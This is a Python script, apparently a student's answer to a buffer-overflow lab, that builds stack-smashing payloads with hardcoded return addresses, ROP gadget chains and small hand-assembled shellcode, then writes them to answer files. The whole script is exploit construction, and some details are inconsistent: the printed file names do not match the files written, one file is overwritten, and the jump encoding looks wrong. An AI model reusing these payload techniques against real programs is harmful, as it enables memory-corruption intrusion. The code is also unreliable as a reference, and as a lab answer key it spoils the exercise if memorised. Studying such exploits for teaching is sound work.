'''
padding = b"A" * 16
func1_address = b'\x16\x12\x40\x00\x00\x00\x00\x00'    # 小端地址
payload = padding+ func1_address
# Write the payload to a file
with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")

padding = b'A' * 16   
pop_rdi_addr = b'\xc7\x12\x40\x00\x00\x00\x00\x00'  
func2_val = b'\xf8\x03\x00\x00\x00\x00\x00\x00'  
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'  
# 正确的payload：按顺序拼接
payload = padding  + pop_rdi_addr + func2_val + func2_addr  
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")

padding = b'A' * 16   
pop_rdi_addr = b'\x4c\x12\x40\x00\x00\x00\x00\x00'  
# 正确的payload：按顺序拼接
payload = padding  + pop_rdi_addr 
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
'''
import struct
# 你的精简机器码（mov edi,0x72 + jmp func1）
SHELLCODE = bytes.fromhex("bf72000000e9f5114000")

payload = (
    b'A'*40                      # 固定padding
    + struct.pack('<Q', 0x40101a)# 纯ret（栈对齐）
    + struct.pack('<Q', 0x4012f1)# mov_rax地址
    + struct.pack('<Q', 0x40131e)# mov_rax的返回地址（jmp_x，合法Gadget）
    + struct.pack('<Q', 0x7fffffffe0e0)# mov_rax的入参（buffer地址）
    + SHELLCODE                  # 赋值机器码
)

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")